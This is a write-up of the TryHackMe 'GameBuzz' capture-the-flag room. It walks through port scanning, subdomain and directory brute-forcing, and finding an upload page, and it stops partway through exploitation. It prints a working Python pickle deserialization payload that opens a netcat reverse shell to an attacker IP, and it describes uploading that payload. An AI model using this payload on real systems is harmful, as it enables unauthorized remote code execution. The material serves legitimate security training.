# <div align='center'>[GameBuzz](https://tryhackme.com/room/gamebuzz)</div>
<div align='center'>Part of Incognito CTF</div>
<div align='center'>
  <img alt="gamebuzz" src="https://github.com/user-attachments/assets/b82d2e36-8800-4cd3-98a7-388c3ff47c7b" height='200'></img>
</div>

St1p 1: Recconance

Let scan the Network:
```bash
~$ nmap 10.10.205.198 -sV -sC -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-08 11:55 IST
Nmap scan report for 10.10.205.198
Host is up (0.17s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Incognito
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

As the only Port 80 is running let take a look

![image](https://github.com/user-attachments/assets/8abe2a1f-be10-4b00-8cf9-06ae27178ffb)

The website seems Static and nothing usefull but at bottom i saw this

![image](https://github.com/user-attachments/assets/3ea0814f-49ef-4e52-8d83-771dcddfeaa5)

When we click on `game rating` button

![image](https://github.com/user-attachments/assets/d7d44968-12a7-42a6-aa07-9b2e1cd1a5d0)

and select any game 

![image](https://github.com/user-attachments/assets/1b31f475-afc9-4d26-a106-3abcccd2cd1d)

it loads a file with a `.pkl` extension.
 ![image](https://github.com/user-attachments/assets/138eb46d-1938-449d-958e-d5ee8b23166e)

we find a domain name a the bottom of the main page:`admin@incognito.com` There might be subdomain 

Doing a subdomain brute force we find a new domain.

Let’s add it to the hosts file.
```bash
echo "10.10.205.198 incognito.com" | sudo tee -a /etc/hosts 
```
```
 ~$ ffuf -u http://incognito.com/ -H "Host: FUZZ.incognito.com" -w wordlists/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt -fw 8853

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://incognito.com/
 :: Wordlist         : FUZZ: /home/death/wordlists/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.incognito.com
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8853
________________________________________________

dev                     [Status: 200, Size: 57, Words: 5, Lines: 2, Duration: 183ms]
:: Progress: [4989/4989] :: Job [1/1] :: 170 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
```

we found `dev.incognito.com` let add this to host file
```
echo "10.10.205.198 dev.incognito.com" | sudo tee -a /etc/hosts 
```

![image](https://github.com/user-attachments/assets/efaac4ca-4150-4a71-b4a4-b556786f63f8)

Let go more deep
```
~$ dirsearch -u http://dev.incognito.com

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/http_dev.incognito.com/_25-06-08_13-28-55.txt

Target: http://dev.incognito.com/

[13:28:55] Starting: 
[13:29:03] 403 -  282B  - /.ht_wsr.txt
[13:29:03] 403 -  282B  - /.htaccess.orig
[13:29:03] 403 -  282B  - /.htaccess.save
[13:29:03] 403 -  282B  - /.htaccess.bak1
[13:29:03] 403 -  282B  - /.htaccess.sample
[13:29:03] 403 -  282B  - /.htaccessOLD
[13:29:03] 403 -  282B  - /.htaccessBAK
[13:29:03] 403 -  282B  - /.htaccess_sc
[13:29:03] 403 -  282B  - /.htaccess_extra
[13:29:03] 403 -  282B  - /.htaccessOLD2
[13:29:03] 403 -  282B  - /.htaccess_orig
[13:29:03] 403 -  282B  - /.htm
[13:29:04] 403 -  282B  - /.html
[13:29:04] 403 -  282B  - /.httr-oauth
[13:29:04] 403 -  282B  - /.htpasswd_test
[13:29:04] 403 -  282B  - /.htpasswds
[13:29:06] 403 -  282B  - /.php
[13:29:37] 404 -   16B  - /composer.phar
[13:29:52] 404 -   16B  - /index.php/login/
[13:30:06] 404 -   16B  - /php-cs-fixer.phar
[13:30:07] 403 -  282B  - /php5.fcgi
[13:30:09] 404 -   16B  - /phpunit.phar
[13:30:14] 200 -   32B  - /robots.txt
[13:30:15] 301 -  323B  - /secret  ->  http://dev.incognito.com/secret/
[13:30:15] 403 -  282B  - /secret/
[13:30:15] 403 -  282B  - /server-status/
[13:30:15] 403 -  282B  - /server-status

Task Completed
```
We found a `Secret` let go more deeper
```
death@esther:~$ dirsearch -u http://dev.incognito.com/secret

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/http_dev.incognito.com/_secret_25-06-08_13-30-28.txt

Target: http://dev.incognito.com/

[13:30:28] Starting: secret/
[13:31:10] 404 -   16B  - /secret/composer.phar
[13:31:24] 404 -   16B  - /secret/index.php/login/
[13:31:38] 404 -   16B  - /secret/php-cs-fixer.phar
[13:31:40] 404 -   16B  - /secret/phpunit.phar
[13:31:56] 301 -  330B  - /secret/upload  ->  http://dev.incognito.com/secret/upload/
[13:31:56] 200 -  236B  - /secret/upload/

Task Completed
```
So we found an upload page `http://dev.incognito.com/secret/upload/`

![image](https://github.com/user-attachments/assets/24f76ccf-fb0d-46cc-921f-2fa45f63dc0f)

Ah ha! There’s an upload feature. Let’s start testing which types of files we can upload.

fire up burpsuite
As it we saw the game rating button carry a `.pkl` file, after search on web i got this revrse shell: Change the ip before use
```
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 10.17.14.127 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Open netcat listner in new terminal
![image](https://github.com/user-attachments/assets/161c73b3-2eca-4f5f-9fe5-5d4a7cb1c392)

Upload the shell
![image](https://github.com/user-attachments/assets/d91a451c-c65f-414f-96b5-6048a3bfb896)

![image](https://github.com/user-attachments/assets/871a1900-11b2-4c2c-9448-f4e349f085f2)

Our shell uploded successfully
![image](https://github.com/user-attachments/assets/67a37349-d2bf-4b32-942d-715b902233dd)

![image](https://github.com/user-attachments/assets/62ea43d1-cfff-40ef-85d5-518d165b7a0a)

Let Execute the shell for doing this back to main website `incognito.com`
![image](https://github.com/user-attachments/assets/e5a68e02-4fc7-4e3c-b817-8d2a17fa877c)

Let capture the request:

![image](https://github.com/user-attachments/assets/eb37078c-6361-4c2e-9a84-551a524bee5c)

Mod the request
